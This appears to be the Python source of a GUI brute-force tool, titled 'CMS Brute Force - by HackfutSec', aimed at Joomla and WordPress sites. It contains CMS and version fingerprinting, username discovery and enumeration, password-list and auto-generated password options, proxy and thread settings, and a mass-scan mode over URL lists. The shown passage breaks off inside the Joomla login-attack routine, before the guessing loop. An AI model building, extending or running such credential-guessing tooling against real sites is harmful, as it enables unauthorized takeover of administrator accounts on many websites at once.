#!/usr/bin/python3
import sys
import os
import requests
import time
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse, urljoin
import re
from time import sleep
import concurrent.futures
from threading import Lock, Semaphore, Thread
from tqdm import tqdm
import itertools
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import json
import webbrowser
from queue import Queue
import socket

# PyQt5 imports
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                             QTextEdit, QGroupBox, QCheckBox, QSpinBox, 
                             QDoubleSpinBox, QFileDialog, QProgressBar,
                             QTabWidget, QSplitter, QMessageBox, QComboBox)
from PyQt5.QtGui import QPalette, QColor, QFont, QPixmap, QMovie

# Configuration
MAX_RETRIES = 3
REQUEST_TIMEOUT = 10
DELAY_BETWEEN_REQUESTS = 0.5
FULL_ACCESS_FILE = "fullaccess.txt"
LIMITED_ACCESS_FILE = "limitaccess.txt"
PASSWORD_RESET_FILE = "password_reset_success.txt"
VULNERABILITIES_FILE = "vulnerabilities.json"
USER_AGENTS_FILE = "user_agents.txt"
PROXIES_FILE = "proxies.txt"
ACTIVE_PROXIES_FILE = "active_proxies.txt"

# Headers par défaut
HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive'
}

# Colors for console output
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    CYBERPUNK = '\033[38;5;201m'  # Cyberpunk pink/purple
    CYBERBLUE = '\033[38;5;81m'   # Cyberpunk blue
    CYBERGREEN = '\033[38;5;118m' # Cyberpunk green
    CYBERYELLOW = '\033[38;5;227m' # Cyberpunk yellow
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Thème Cyberpunk amélioré
CYBERPUNK_BG = "#0a0a12"
CYBERPUNK_FG = "#00ff99"
CYBERPUNK_ACCENT = "#ff0099"
CYBERPUNK_SECONDARY = "#6600ff"
CYBERPUNK_TEXT = "#e0e0e0"
CYBERPUNK_FONT = ("Consolas", 10)
CYBERPUNK_BUTTON_ACTIVE = "#ff00ff"
CYBERPUNK_HIGHLIGHT = "#00ffff"

class CMSDetector:
    """Classe pour détecter le CMS utilisé par un site web"""
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'})
    
    def detect_cms(self, url):
        """Détecte le CMS utilisé par le site (Joomla, WordPress ou autre)"""
        try:
            # Normaliser l'URL
            if not url.startswith('http'):
                url = f'http://{url}'
            
            response = self.session.get(url, timeout=10)
            if response.status_code != 200:
                return "unknown", None, None
            
            content = response.text
            
            # Détection Joomla
            joomla_indicators = [
                'joomla',
                'Joomla!',
                'content="Joomla',
                'components/com_',
                'index.php?option=com_',
                '/media/jui/',
                '/media/system/'
            ]
            
            is_joomla = any(indicator.lower() in content.lower() for indicator in joomla_indicators)
            
            if is_joomla:
                version = self.detect_joomla_version(content, url)
                return "joomla", version, url
            
            # Détection WordPress
            wordpress_indicators = [
                'wp-content',
                'wp-includes',
                'wordpress',
                '/wp-json/',
                'wp-admin',
                'wp-login.php'
            ]
            
            is_wordpress = any(indicator.lower() in content.lower() for indicator in wordpress_indicators)
            
            if is_wordpress:
                version = self.detect_wordpress_version(content, url)
                return "wordpress", version, url
            
            return "unknown", None, url
            
        except Exception as e:
            return "unknown", None, url
    
    def detect_joomla_version(self, content, url):
        """Détecte la version de Joomla"""
        version = None
        
        # Méthode 1: Meta generator
        soup = BeautifulSoup(content, 'html.parser')
        meta_generator = soup.find('meta', attrs={'name': 'generator'})
        if meta_generator and 'Joomla' in meta_generator.get('content', ''):
            version_match = re.search(r'Joomla!?\s*(\d+\.\d+(?:\.\d+)?)', meta_generator.get('content', ''))
            if version_match:
                version = version_match.group(1)
        
        # Méthode 2: Fichiers de version
        if not version:
            version_files = [
                '/administrator/manifests/files/joomla.xml',
                '/language/en-GB/en-GB.xml',
                '/libraries/joomla/version.php'
            ]
            
            for vfile in version_files:
                try:
                    vresponse = self.session.get(url + vfile, timeout=5)
                    if vresponse.status_code == 200:
                        version_match = re.search(r'<version>(\d+\.\d+(?:\.\d+)?)</version>', vresponse.text)
                        if version_match:
                            version = version_match.group(1)
                            break
                except:
                    continue
        
        # Méthode 3: Dans le code HTML/JS
        if not version:
            version_match = re.search(r'Joomla!?[^\\n\\r]*?(\d+\.\d+(?:\.\d+)?)', content)
            if version_match:
                version = version_match.group(1)
        
        return version
    
    def detect_wordpress_version(self, content, url):
        """Détecte la version de WordPress"""
        version = None
        
        # Méthode 1: Meta generator
        soup = BeautifulSoup(content, 'html.parser')
        meta_generator = soup.find('meta', attrs={'name': 'generator'})
        if meta_generator and 'WordPress' in meta_generator.get('content', ''):
            version_match = re.search(r'WordPress\s*(\d+\.\d+(?:\.\d+)?)', meta_generator.get('content', ''))
            if version_match:
                version = version_match.group(1)
        
        # Méthode 2: Fichiers de version
        if not version:
            version_files = [
                '/wp-includes/version.php',
                '/readme.html'
            ]
            
            for vfile in version_files:
                try:
                    vresponse = self.session.get(url + vfile, timeout=5)
                    if vresponse.status_code == 200:
                        if 'version.php' in vfile:
                            version_match = re.search(r'\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]', vresponse.text)
                        else:  # readme.html
                            version_match = re.search(r'Version\s*(\d+\.\d+(?:\.\d+)?)', vresponse.text)
                        
                        if version_match:
                            version = version_match.group(1)
                            break
                except:
                    continue
        
        # Méthode 3: Dans le code HTML/JS
        if not version:
            version_match = re.search(r'WordPress[^\\n\\r]*?(\d+\.\d+(?:\.\d+)?)', content)
            if version_match:
                version = version_match.group(1)
        
        return version

class CyberpunkStyle:
    @staticmethod
    def apply(app):
        # Set cyberpunk color palette
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(0, 0, 0))
        palette.setColor(QPalette.WindowText, QColor(0, 255, 255))
        palette.setColor(QPalette.Base, QColor(0, 0, 0, 180))
        palette.setColor(QPalette.AlternateBase, QColor(0, 20, 20))
        palette.setColor(QPalette.ToolTipBase, QColor(0, 255, 255))
        palette.setColor(QPalette.ToolTipText, QColor(0, 0, 0))
        palette.setColor(QPalette.Text, QColor(0, 255, 255))
        palette.setColor(QPalette.Button, QColor(0, 30, 30))
        palette.setColor(QPalette.ButtonText, QColor(0, 255, 255))
        palette.setColor(QPalette.BrightText, QColor(255, 0, 255))
        palette.setColor(QPalette.Highlight, QColor(255, 0, 255, 100))
        palette.setColor(QPalette.HighlightedText, QColor(255, 255, 0))
        
        app.setPalette(palette)
        
        # Set cyberpunk style
        app.setStyleSheet("""
            QMainWindow {
                background: transparent;
                border: 2px solid #00ffff;
                border-radius: 10px;
            }
            
            QWidget {
                background: transparent;
            }
            
            QGroupBox {
                font-weight: bold;
                border: 2px solid #ff00ff;
                border-radius: 5px;
                margin-top: 1ex;
                color: #00ffff;
            }
            
            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding: 0 5px;
                color: #ff00ff;
            }
            
            QLabel {
                color: #00ffff;
            }
            
            QLineEdit, QComboBox {
                background-color: #001010;
                color: #00ffff;
                border: 1px solid #ff00ff;
                border-radius: 3px;
                padding: 5px;
                selection-background-color: #ff00ff;
            }
            
            QPushButton {
                background-color: #001010;
                color: #00ffff;
                border: 2px solid #ff00ff;
                border-radius: 5px;
                padding: 5px;
                font-weight: bold;
            }
            
            QPushButton:hover {
                background-color: #ff00ff;
                color: #000000;
            }
            
            QPushButton:pressed {
                background-color: #00ffff;
                color: #000000;
            }
            
            QPushButton:disabled {
                background-color: #202020;
                color: #606060;
                border: 2px solid #404040;
            }
            
            QTextEdit {
                background-color: #000000;
                color: #00ffff;
                border: 1px solid #ff00ff;
                border-radius: 3px;
                font-family: 'Courier New', monospace;
            }
            
            QProgressBar {
                border: 2px solid #ff00ff;
                border-radius: 5px;
                text-align: center;
                color: #00ffff;
                font-weight: bold;
            }
            
            QProgressBar::chunk {
                background-color: #ff00ff;
                width: 10px;
            }
            
            QCheckBox {
                color: #00ffff;
                spacing: 5px;
            }
            
            QCheckBox::indicator {
                width: 15px;
                height: 15px;
                border: 2px solid #ff00ff;
                border-radius: 3px;
                background: #001010;
            }
            
            QCheckBox::indicator:checked {
                background: #ff00ff;
            }
            
            QSpinBox, QDoubleSpinBox {
                background-color: #001010;
                color: #00ffff;
                border: 1px solid #ff00ff;
                border-radius: 3px;
                padding: 5px;
            }
            
            QTabWidget::pane {
                border: 2px solid #ff00ff;
                border-radius: 5px;
                background: rgba(0, 10, 10, 200);
            }
            
            QTabBar::tab {
                background: #001010;
                color: #00ffff;
                border: 1px solid #ff00ff;
                border-bottom: none;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
                padding: 5px 10px;
                margin-right: 2px;
            }
            
            QTabBar::tab:selected {
                background: #ff00ff;
                color: #000000;
            }
        """)


class TransparentWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CMS Brute Force - by HackfutSec")
        self.setWindowIcon(QtGui.QIcon.fromTheme("security-medium"))
        
        # Set window size and position
        self.resize(1000, 700)
        self.center()
        
        # Set window flags for transparency
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setWindowFlags(Qt.FramelessWindowHint)
        
        # Set cyberpunk background
        self.background_label = QLabel(self)
        self.background_label.setAlignment(Qt.AlignCenter)
        self.background_label.setGeometry(0, 0, self.width(), self.height())
        
        # Load background image
        self.load_background()
        
        # Create central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        layout = QVBoxLayout(central_widget)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # Title label
        title_label = QLabel("CMS BRUTE FORCE - by HackfutSec")
        title_font = QFont("Courier New", 20, QFont.Bold)
        title_label.setFont(title_font)
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("color: #ff00ff; background: transparent;")
        layout.addWidget(title_label)
        
        # Create tabs
        tabs = QTabWidget()
        layout.addWidget(tabs)
        
        # Single target tab
        single_tab = QWidget()
        single_layout = QVBoxLayout(single_tab)
        tabs.addTab(single_tab, "Single Target")
        
        # Mass scan tab
        mass_tab = QWidget()
        mass_layout = QVBoxLayout(mass_tab)
        tabs.addTab(mass_tab, "Mass Scan")
        
        # Build single target UI
        self.build_single_target_ui(single_layout)
        
        # Build mass scan UI
        self.build_mass_scan_ui(mass_layout)
        
        # Output console
        output_group = QGroupBox("Output Console")
        output_layout = QVBoxLayout(output_group)
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        output_layout.addWidget(self.output_text)
        layout.addWidget(output_group)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        layout.addWidget(self.progress_bar)
        
        # Control buttons
        control_layout = QHBoxLayout()
        self.start_button = QPushButton("Start Attack")
        self.start_button.clicked.connect(self.start_attack)
        control_layout.addWidget(self.start_button)
        
        self.stop_button = QPushButton("Stop")
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setEnabled(False)
        control_layout.addWidget(self.stop_button)
        
        self.clear_button = QPushButton("Clear Output")
        self.clear_button.clicked.connect(self.clear_output)
        control_layout.addWidget(self.clear_button)
        
        layout.addLayout(control_layout)
        
        # Initialize scanner
        self.cms_detector = CMSDetector()
        self.scanner_thread = None
        self.is_running = False
        
    def center(self):
        frame_geometry = self.frameGeometry()
        center_point = QtWidgets.QDesktopWidget().availableGeometry().center()
        frame_geometry.moveCenter(center_point)
        self.move(frame_geometry.topLeft())
        
    def load_background(self):
        # Download the background image if not exists
        bg_path = os.path.join(os.path.dirname(__file__), "hack_bg.jpg")
        if not os.path.exists(bg_path):
            try:
                response = requests.get("https://i.postimg.cc/prRDmq4P/hack.jpg")
                with open(bg_path, 'wb') as f:
                    f.write(response.content)
            except:
                # Use a solid color if download fails
                self.background_label.setStyleSheet("background-color: #000000;")
                return
        
        # Set background with transparency
        pixmap = QPixmap(bg_path)
        scaled_pixmap = pixmap.scaled(self.size(), Qt.IgnoreAspectRatio, Qt.SmoothTransformation)
        
        # Create a transparent overlay
        transparent_pixmap = QPixmap(scaled_pixmap.size())
        transparent_pixmap.fill(Qt.transparent)
        
        painter = QtGui.QPainter(transparent_pixmap)
        painter.setOpacity(0.5)  # 50% transparency
        painter.drawPixmap(0, 0, scaled_pixmap)
        painter.end()
        
        self.background_label.setPixmap(transparent_pixmap)
        
    def resizeEvent(self, event):
        self.background_label.setGeometry(0, 0, self.width(), self.height())
        self.load_background()
        super().resizeEvent(event)
        
    def build_single_target_ui(self, layout):
        # URL input
        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("Target URL:"))
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com")
        url_layout.addWidget(self.url_input)
        layout.addLayout(url_layout)
        
        # Username options
        user_group = QGroupBox("Username Options")
        user_layout = QVBoxLayout(user_group)
        
        # Single username
        single_user_layout = QHBoxLayout()
        single_user_layout.addWidget(QLabel("Single Username:"))
        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("admin")
        single_user_layout.addWidget(self.username_input)
        user_layout.addLayout(single_user_layout)
        
        # User list file
        user_file_layout = QHBoxLayout()
        user_file_layout.addWidget(QLabel("User List File:"))
        self.user_file_input = QLineEdit()
        user_file_layout.addWidget(self.user_file_input)
        self.user_file_button = QPushButton("Browse")
        self.user_file_button.clicked.connect(self.browse_user_file)
        user_file_layout.addWidget(self.user_file_button)
        user_layout.addLayout(user_file_layout)
        
        # Auto discover users
        self.auto_user_check = QCheckBox("Auto Discover Usernames")
        user_layout.addWidget(self.auto_user_check)
        
        # User enumeration
        self.user_enum_check = QCheckBox("Perform Detailed User Enumeration")
        user_layout.addWidget(self.user_enum_check)
        
        layout.addWidget(user_group)
        
        # Password options
        pass_group = QGroupBox("Password Options")
        pass_layout = QVBoxLayout(pass_group)
        
        # Password list file
        pass_file_layout = QHBoxLayout()
        pass_file_layout.addWidget(QLabel("Password List File:"))
        self.pass_file_input = QLineEdit()
        pass_file_layout.addWidget(self.pass_file_input)
        self.pass_file_button = QPushButton("Browse")
        self.pass_file_button.clicked.connect(self.browse_pass_file)
        pass_file_layout.addWidget(self.pass_file_button)
        pass_layout.addLayout(pass_file_layout)
        
        # Auto generate passwords
        auto_pass_layout = QHBoxLayout()
        self.auto_pass_check = QCheckBox("Auto Generate Passwords")
        auto_pass_layout.addWidget(self.auto_pass_check)
        
        auto_pass_layout.addWidget(QLabel("Domain:"))
        self.domain_input = QLineEdit()
        self.domain_input.setPlaceholderText("example.com")
        auto_pass_layout.addWidget(self.domain_input)
        pass_layout.addLayout(auto_pass_layout)
        
        layout.addWidget(pass_group)
        
        # Advanced options
        adv_group = QGroupBox("Advanced Options")
        adv_layout = QVBoxLayout(adv_group)
        
        # Proxy
        proxy_layout = QHBoxLayout()
        proxy_layout.addWidget(QLabel("Proxy:"))
        self.proxy_input = QLineEdit()
        self.proxy_input.setPlaceholderText("http://127.0.0.1:8080")
        proxy_layout.addWidget(self.proxy_input)
        adv_layout.addLayout(proxy_layout)
        
        # Delay
        delay_layout = QHBoxLayout()
        delay_layout.addWidget(QLabel("Delay between requests (sec):"))
        self.delay_input = QDoubleSpinBox()
        self.delay_input.setRange(0, 10)
        self.delay_input.setValue(0)
        self.delay_input.setSingleStep(0.1)
        delay_layout.addWidget(self.delay_input)
        adv_layout.addLayout(delay_layout)
        
        # Threads
        threads_layout = QHBoxLayout()
        threads_layout.addWidget(QLabel("Threads:"))
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, 50)
        self.threads_input.setValue(5)
        threads_layout.addWidget(self.threads_input)
        adv_layout.addLayout(threads_layout)
        
        # Verbose output
        self.verbose_check = QCheckBox("Verbose Output")
        adv_layout.addWidget(self.verbose_check)
        
        layout.addWidget(adv_group)
        
    def build_mass_scan_ui(self, layout):
        # URL list file
        url_file_layout = QHBoxLayout()
        url_file_layout.addWidget(QLabel("URL List File:"))
        self.url_file_input = QLineEdit()
        url_file_layout.addWidget(self.url_file_input)
        self.url_file_button = QPushButton("Browse")
        self.url_file_button.clicked.connect(self.browse_url_file)
        url_file_layout.addWidget(self.url_file_button)
        layout.addLayout(url_file_layout)
        
        # Username options (same as single target)
        user_group = QGroupBox("Username Options")
        user_layout = QVBoxLayout(user_group)
        
        # Single username
        single_user_layout = QHBoxLayout()
        single_user_layout.addWidget(QLabel("Single Username:"))
        self.mass_username_input = QLineEdit()
        self.mass_username_input.setPlaceholderText("admin")
        single_user_layout.addWidget(self.mass_username_input)
        user_layout.addLayout(single_user_layout)
        
        # User list file
        user_file_layout = QHBoxLayout()
        user_file_layout.addWidget(QLabel("User List File:"))
        self.mass_user_file_input = QLineEdit()
        user_file_layout.addWidget(self.mass_user_file_input)
        self.mass_user_file_button = QPushButton("Browse")
        self.mass_user_file_button.clicked.connect(self.browse_mass_user_file)
        user_file_layout.addWidget(self.mass_user_file_button)
        user_layout.addLayout(user_file_layout)
        
        # Auto discover users
        self.mass_auto_user_check = QCheckBox("Auto Discover Usernames")
        user_layout.addWidget(self.mass_auto_user_check)
        
        layout.addWidget(user_group)
        
        # Password options (same as single target)
        pass_group = QGroupBox("Password Options")
        pass_layout = QVBoxLayout(pass_group)
        
        # Password list file
        pass_file_layout = QHBoxLayout()
        pass_file_layout.addWidget(QLabel("Password List File:"))
        self.mass_pass_file_input = QLineEdit()
        pass_file_layout.addWidget(self.mass_pass_file_input)
        self.mass_pass_file_button = QPushButton("Browse")
        self.mass_pass_file_button.clicked.connect(self.browse_mass_pass_file)
        pass_file_layout.addWidget(self.mass_pass_file_button)
        pass_layout.addLayout(pass_file_layout)
        
        # Auto generate passwords
        auto_pass_layout = QHBoxLayout()
        self.mass_auto_pass_check = QCheckBox("Auto Generate Passwords")
        auto_pass_layout.addWidget(self.mass_auto_pass_check)
        
        auto_pass_layout.addWidget(QLabel("Domain:"))
        self.mass_domain_input = QLineEdit()
        self.mass_domain_input.setPlaceholderText("example.com")
        auto_pass_layout.addWidget(self.mass_domain_input)
        pass_layout.addLayout(auto_pass_layout)
        
        layout.addWidget(pass_group)
        
        # Advanced options
        adv_group = QGroupBox("Advanced Options")
        adv_layout = QVBoxLayout(adv_group)
        
        # Proxy
        proxy_layout = QHBoxLayout()
        proxy_layout.addWidget(QLabel("Proxy:"))
        self.mass_proxy_input = QLineEdit()
        self.mass_proxy_input.setPlaceholderText("http://127.0.0.1:8080")
        proxy_layout.addWidget(self.mass_proxy_input)
        adv_layout.addLayout(proxy_layout)
        
        # Delay
        delay_layout = QHBoxLayout()
        delay_layout.addWidget(QLabel("Delay between requests (sec):"))
        self.mass_delay_input = QDoubleSpinBox()
        self.mass_delay_input.setRange(0, 10)
        self.mass_delay_input.setValue(0)
        self.mass_delay_input.setSingleStep(0.1)
        delay_layout.addWidget(self.mass_delay_input)
        adv_layout.addLayout(delay_layout)
        
        # Threads
        threads_layout = QHBoxLayout()
        threads_layout.addWidget(QLabel("Threads:"))
        self.mass_threads_input = QSpinBox()
        self.mass_threads_input.setRange(1, 50)
        self.mass_threads_input.setValue(5)
        threads_layout.addWidget(self.mass_threads_input)
        adv_layout.addLayout(threads_layout)
        
        # Verbose output
        self.mass_verbose_check = QCheckBox("Verbose Output")
        adv_layout.addWidget(self.mass_verbose_check)
        
        layout.addWidget(adv_group)
        
    def browse_user_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select User List File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.user_file_input.setText(file_path)
            
    def browse_pass_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Password List File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.pass_file_input.setText(file_path)
            
    def browse_url_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select URL List File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.url_file_input.setText(file_path)
            
    def browse_mass_user_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select User List File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.mass_user_file_input.setText(file_path)
            
    def browse_mass_pass_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Password List File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.mass_pass_file_input.setText(file_path)
            
    def log_output(self, message, color="#00ffff"):
        self.output_text.append(f'<font color="{color}">{message}</font>')
        self.output_text.verticalScrollBar().setValue(self.output_text.verticalScrollBar().maximum())
        
    def clear_output(self):
        self.output_text.clear()
        
    def start_attack(self):
        if self.is_running:
            return
            
        self.is_running = True
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        
        # Get current tab index to determine which mode to use
        current_tab = self.centralWidget().findChild(QTabWidget).currentIndex()
        
        if current_tab == 0:  # Single target
            self.start_single_attack()
        else:  # Mass scan
            self.start_mass_attack()
            
    def start_single_attack(self):
        # Validate inputs
        url = self.url_input.text().strip()
        if not url:
            self.log_output("Error: Target URL is required", "#ff0000")
            self.stop_attack()
            return
            
        # Create scanner thread
        self.scanner_thread = ScannerThread(
            url=url,
            username=self.username_input.text().strip(),
            user_file=self.user_file_input.text().strip(),
            password_file=self.pass_file_input.text().strip(),
            auto_user=self.auto_user_check.isChecked(),
            user_enum=self.user_enum_check.isChecked(),
            auto_pass=self.auto_pass_check.isChecked(),
            domain=self.domain_input.text().strip(),
            proxy=self.proxy_input.text().strip(),
            delay=self.delay_input.value(),
            threads=self.threads_input.value(),
            verbose=self.verbose_check.isChecked(),
            mass_scan=False
        )
        
        self.scanner_thread.log_signal.connect(self.log_output)
        self.scanner_thread.progress_signal.connect(self.progress_bar.setValue)
        self.scanner_thread.finished_signal.connect(self.attack_finished)
        
        self.scanner_thread.start()
        
    def start_mass_attack(self):
        # Validate inputs
        url_file = self.url_file_input.text().strip()
        if not url_file:
            self.log_output("Error: URL list file is required for mass scan", "#ff0000")
            self.stop_attack()
            return
            
        # Create scanner thread
        self.scanner_thread = ScannerThread(
            url_file=url_file,
            username=self.mass_username_input.text().strip(),
            user_file=self.mass_user_file_input.text().strip(),
            password_file=self.mass_pass_file_input.text().strip(),
            auto_user=self.mass_auto_user_check.isChecked(),
            user_enum=False,  # Not implemented for mass scan
            auto_pass=self.mass_auto_pass_check.isChecked(),
            domain=self.mass_domain_input.text().strip(),
            proxy=self.mass_proxy_input.text().strip(),
            delay=self.mass_delay_input.value(),
            threads=self.mass_threads_input.value(),
            verbose=self.mass_verbose_check.isChecked(),
            mass_scan=True
        )
        
        self.scanner_thread.log_signal.connect(self.log_output)
        self.scanner_thread.progress_signal.connect(self.progress_bar.setValue)
        self.scanner_thread.finished_signal.connect(self.attack_finished)
        
        self.scanner_thread.start()
        
    def stop_attack(self):
        if self.scanner_thread and self.scanner_thread.isRunning():
            self.scanner_thread.stop()
            self.scanner_thread.wait()
            
        self.is_running = False
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.progress_bar.setVisible(False)
        
    def attack_finished(self):
        self.log_output("Attack finished!", "#00ff00")
        self.stop_attack()
        
    def closeEvent(self, event):
        if self.is_running:
            reply = QMessageBox.question(self, 'Confirm Exit', 
                                       'An attack is in progress. Are you sure you want to exit?',
                                       QMessageBox.Yes | QMessageBox.No, 
                                       QMessageBox.No)
            
            if reply == QMessageBox.Yes:
                self.stop_attack()
                event.accept()
            else:
                event.ignore()
        else:
            event.accept()


class ScannerThread(QThread):
    log_signal = pyqtSignal(str, str)
    progress_signal = pyqtSignal(int)
    finished_signal = pyqtSignal()
    
    def __init__(self, **kwargs):
        super().__init__()
        self.kwargs = kwargs
        self.stopped = False
        
    def run(self):
        try:
            # First detect CMS type
            url = self.kwargs.get('url', '')
            url_file = self.kwargs.get('url_file', '')
            
            if url:  # Single target
                cms_detector = CMSDetector()
                cms_type, version, target_url = cms_detector.detect_cms(url)
                
                if cms_type == "joomla":
                    self.log_signal.emit(f"Target is Joomla {version if version else 'unknown version'}", "#00ff00")
                    scanner = JoomlaBruteForceGUI(**self.kwargs)
                elif cms_type == "wordpress":
                    self.log_signal.emit(f"Target is WordPress {version if version else 'unknown version'}", "#00ff00")
                    scanner = WordPressBruteForceGUI(**self.kwargs)
                else:
                    self.log_signal.emit("Target does not appear to be Joomla or WordPress", "#ff0000")
                    self.finished_signal.emit()
                    return
                    
            elif url_file:  # Mass scan
                scanner = MassScannerGUI(**self.kwargs)
            else:
                self.log_signal.emit("Error: No target specified", "#ff0000")
                self.finished_signal.emit()
                return
                
            scanner.log_callback = self.log_signal.emit
            scanner.progress_callback = self.progress_signal.emit
            scanner.stop_check = lambda: self.stopped
            
            scanner.run()
            
        except Exception as e:
            self.log_signal.emit(f"Error: {str(e)}", "#ff0000")
            
        self.finished_signal.emit()
        
    def stop(self):
        self.stopped = True


class JoomlaScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'})
        self.lock = Lock()
        
    def detect_joomla(self, url):
        """Détecte si un site utilise Joomla et sa version"""
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code != 200:
                return False, None
                
            # Vérifier les signes caractéristiques de Joomla
            joomla_indicators = [
                'joomla',
                'Joomla!',
                'content="Joomla',
                'components/com_',
                'index.php?option=com_',
                '/media/jui/',
                '/media/system/'
            ]
            
            content = response.text
            is_joomla = any(indicator in content for indicator in joomla_indicators)
            
            if not is_joomla:
                return False, None
                
            # Détection de la version
            version = None
            
            # Méthode 1: Meta generator
            soup = BeautifulSoup(content, 'html.parser')
            meta_generator = soup.find('meta', attrs={'name': 'generator'})
            if meta_generator and 'Joomla' in meta_generator.get('content', ''):
                version_match = re.search(r'Joomla!?\s*(\d+\.\d+(?:\.\d+)?)', meta_generator.get('content', ''))
                if version_match:
                    version = version_match.group(1)
            
            # Méthode 2: Fichiers de version
            if not version:
                version_files = [
                    '/administrator/manifests/files/joomla.xml',
                    '/language/en-GB/en-GB.xml',
                    '/libraries/joomla/version.php'
                ]
                
                for vfile in version_files:
                    try:
                        vresponse = self.session.get(url + vfile, timeout=5)
                        if vresponse.status_code == 200:
                            version_match = re.search(r'<version>(\d+\.\d+(?:\.\d+)?)</version>', vresponse.text)
                            if version_match:
                                version = version_match.group(1)
                                break
                    except:
                        continue
            
            # Méthode 3: Dans le code HTML/JS
            if not version:
                version_match = re.search(r'Joomla!?[^\\n\\r]*?(\d+\.\d+(?:\.\d+)?)', content)
                if version_match:
                    version = version_match.group(1)
            
            return True, version
            
        except Exception as e:
            return False, None


class JoomlaBruteForceGUI:
    def __init__(self, **kwargs):
        self.kwargs = kwargs
        self.log_callback = None
        self.progress_callback = None
        self.stop_check = None
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'})
        self.lock = Lock()
        self.found_credentials = []
        self.scanner = JoomlaScanner()
        
    def log(self, message, color="#00ffff"):
        if self.log_callback:
            self.log_callback(message, color)
            
    def progress(self, value):
        if self.progress_callback:
            self.progress_callback(value)
            
    def should_stop(self):
        return self.stop_check() if self.stop_check else False
        
    def run(self):
        mass_scan = self.kwargs.get('mass_scan', False)
        
        if mass_scan:
            self.run_mass_scan()
        else:
            self.run_single_scan()
            
    def run_single_scan(self):
        url = self.kwargs.get('url', '')
        self.log(f"Starting Joomla attack on: {url}", "#00ffff")
        
        # Détecter Joomla et sa version
        is_joomla, version = self.scanner.detect_joomla(url)
        if not is_joomla:
            self.log("Target does not appear to be a Joomla site", "#ff0000")
            return
            
        version_str = f"v{version}" if version else "unknown version"
        self.log(f"Target is Joomla {version_str}", "#00ff00")
        
        # Réinitialiser la session avant de commencer
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'})
        
        # Initialiser la session
        base_url = url.rstrip('/')
        administrator_url = base_url + '/administrator/'
        ret = 'aW5kZXgucGhw'
        option = 'com_login'
        task = 'login'
        
        try:
            response = self.session.get(administrator_url, proxies=self.get_proxy(), timeout=10)
            self.session.cookies.clear()  # Nettoyer les cookies initiaux
        except requests.RequestException as e:
            self.log(f"Error connecting to target: {e}", "#ff0000")
            return
        
        # Découvrir les usernames si nécessaire
        discovered_users = []
        meta_authors = []
        
        auto_user = self.kwargs.get('auto_user', False)
        user_enum = self.kwargs.get('user_enum', False)
        auto_mode = self.kwargs.get('auto_pass', False)
        username = self.kwargs.get('username', '')
        user_file = self.kwargs.get('user_file', '')
        
        if auto_user or user_enum or auto_mode:
            self.log("Attempting to discover usernames...", "#00ffff")
            discovered_users, meta_authors = self.discover_usernames(base_url, administrator_url)
        elif user_file:
            try:
                # Try different encodings to handle the file
                encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
                for encoding in encodings:
                    try:
                        with open(user_file, 'r', encoding=encoding) as f:
                            discovered_users = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue
                if not discovered_users:
                    self.log(f"Could not read user file with any encoding: {user_file}", "#ff0000")
                    return
            except FileNotFoundError:
                self.log(f"User file not found: {user_file}", "#ff0000")
                return
        elif username:
            discovered_users = [username]
        else:
            self.log("No usernames specified", "#ff0000")
            return
            
        # Prioritize meta authors if found
